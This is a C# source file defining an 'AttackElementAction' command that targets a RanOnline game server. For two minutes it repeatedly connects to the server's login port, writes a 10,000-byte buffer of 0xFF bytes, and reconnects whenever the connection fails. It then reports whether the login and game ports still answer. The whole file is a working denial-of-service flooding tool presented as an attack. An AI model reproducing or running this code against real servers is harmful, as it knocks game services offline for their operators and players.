using Framework;
using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace RanOnlineCore.Action.AttackAction
{
    public class AttackElementAction : CommandBase<dynamic>
    {
        private SimpleTcpClient Client { get; set; }
        private byte[] Data { get; set; }
        private List<string> Messages { get; set; }
        private ObjectContext Context { get; set; }
        protected override void ValidateCore(ObjectContext context)
        {
            this.Context = context;
            this.Add("[STARTING...]");
            this.Client = new SimpleTcpClient();
            this.Messages = new List<string>();
        }
        protected override void OnExecutedCore(ObjectContext context, Result<dynamic> result)
        {
            this.Add("[END]");
        }
        protected override void OnExecutingCore(ObjectContext context)
        {
            this.Client.DataReceived += Client_DataReceived;
            this.Data = Enumerable.Range(0, 10000).Select(x => Convert.ToByte(255)).ToArray();

        }
        private void Add(string key)
        {
            this.Context.Push($"[{DateTime.Now.ToString("yyyy-MM-dd HH:mm")}]{key}");
        }
        private void Client_DataReceived(object sender, Message e)
        {
            this.Data = e.Data;
            this.Add("[RECEIVED]");
        }
        private bool CheckLogin(ObjectContext context)
        {
            try
            {
                Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        private bool CheckGame(ObjectContext context)
        {
            try
            {
                Client.Connect(context.ElementsZO.IP, context.ElementsZO.GamePort);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        protected override Result<dynamic> ExecuteCore(ObjectContext context)
        {
            var time = DateTime.Now.AddMinutes(2);
            var current = 4;
            while (DateTime.Now.Ticks < time.Ticks && current > 0)
            {
                try
                {
                    if(Client.TcpClient == null)
                    {
                        Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                    }
                    if (!Client.TcpClient.Connected)
                    {
                        Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                    }
                    Client.Write(Data);
                    this.Add("[SUCCESS]");
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    Client = new SimpleTcpClient();
                    Client.DataReceived += Client_DataReceived;
                    current--;
                    this.Add($"[RETRY]");
                }
            }
            return Success(new
            {
                name = context.ElementsZO.Name,
                login_status = this.CheckLogin(context),
                game_status = this.CheckGame(context),
                content = this.Messages
            });
        }
    }
}
